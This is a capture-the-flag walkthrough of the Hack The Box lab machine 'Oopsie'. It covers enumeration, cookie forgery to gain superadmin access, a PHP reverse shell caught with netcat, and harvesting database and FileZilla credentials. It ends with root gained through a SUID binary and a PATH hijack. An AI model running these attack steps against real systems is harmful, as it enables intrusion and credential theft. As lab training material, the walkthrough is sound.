---
title: HTB - Oopsie Walkthrough
date: 2021-08-09 14:52:15
tags: [WalkThrough, HTB, Penetration Testing, Starting Point]
---

# Enueration
## brief scan for open port
```
nmap -p- --min-rate=1000 -T4 10.10.10.28 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$// >> ports.txt
```
## detailed scan
```
nmap -sC -sV -p`cat ports.txt` 10.10.10.28
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-09 03:00 EDT
Nmap scan report for 10.10.10.28
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.48 seconds
```

port 80 is open, take a look use browser

try dirb：
```
dirb 10.10.10.28 -r -z 10
-r to scan non-recursively, and -z 10 to add a 10 millisecond delay to each request  

---- Scanning URL: http://10.10.10.28/ ----
==> DIRECTORY: http://10.10.10.28/css/                                                        
==> DIRECTORY: http://10.10.10.28/fonts/                                                      
==> DIRECTORY: http://10.10.10.28/images/                                                     
+ http://10.10.10.28/index.php (CODE:200|SIZE:10932)                                          
==> DIRECTORY: http://10.10.10.28/js/                                                         
+ http://10.10.10.28/server-status (CODE:403|SIZE:276)                                        
==> DIRECTORY: http://10.10.10.28/themes/                                                     
==> DIRECTORY: http://10.10.10.28/uploads/                                                    
                                                                                              
-----------------
END_TIME: Mon Aug  9 04:10:08 2021
DOWNLOADED: 4612 - FOUND: 2

```

try nikto:
```
nikto -h 10.10.10.28
```

By inspect the page source, we found `<script src="/cdn-cgi/login/script.js"></script>`

inspect `cdn-cgi/login` page

![image](/images/oopsie_login_page.png "screenshot of login page")

try sql injection:
...

WTF, we can use the obtained from first box?? are they related? use common username `admin`

find upload tab： it says `This action require super admin rights.`

`http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=1` can reveal account infos use burpsuite to brute force

add to intruder `Ctrl+i`, go to `position` tab, clear all the selection, then select `1` in the url, `add` 

create payload use command
```
for x in $(seq 1 100);do echo $x;done > ids.txt
```

load the payload

If necessary, setup redirection option in `option` tab: `always`, check `process cookie in redirections`

sort by response length, we found id = 30:
```
86575	super admin	superadmin@megacorp.com
```

we found there are two cookies:
```
Cookie: user=34322; role=admin
```
try to change it to
```
user=86575; role=superadmin
```

then we can access upload page:

upload the php-reverse shell, as we discovered use dirb above, there's a path `uploads/` lets try `/uploads/php-shell1.php` 

first open a listening port on `4444`
```
nc -nvlp 4444

listening on [any] 4444 ...
connect to [10.10.14.75] from (UNKNOWN) [10.10.10.28] 57424
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:25:22 up  3:11,  1 user,  load average: 0.01, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
robert   pts/1    10.10.15.98      05:55    1:26m  0.06s  0.06s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

get the shell for user `www-data`

in `/var/www/html/cdn-cgi/login`, found `db.php`

```
$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```
https://www.php.net/manual/en/mysqli.construct.php


ssh to `robert`

```
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

check if bugtracker group has any special access

```
find / -type f -group bugtracker 2>/dev/null
/usr/bin/bugtracker


f      regular file
redirct stderr to null, otherwise there's a lot of permission deny error
```


```
robert@oopsie:~$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 123
---------------

cat: /root/reports/123: No such file or directory
```

it seems bugtracker can cat file under /root/reports/, lets try /root/report/../root.txt

get the flag

the official guide give another option, the bugtracker will execute cat with root permission
```
robert@oopsie:~$ ls -l /usr/bin/bugtracker 
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

we could forge a cat binary with shell program
```
export PATH=/tmp:$PATH
cd /tmp/
echo '/bin/sh' > cat
chmod +x cat
```


then run `/usr/bin/bugtracker`, we gain the root shell

```
# cat filezilla.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.46</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>
# pwd
/root/.config/filezilla
```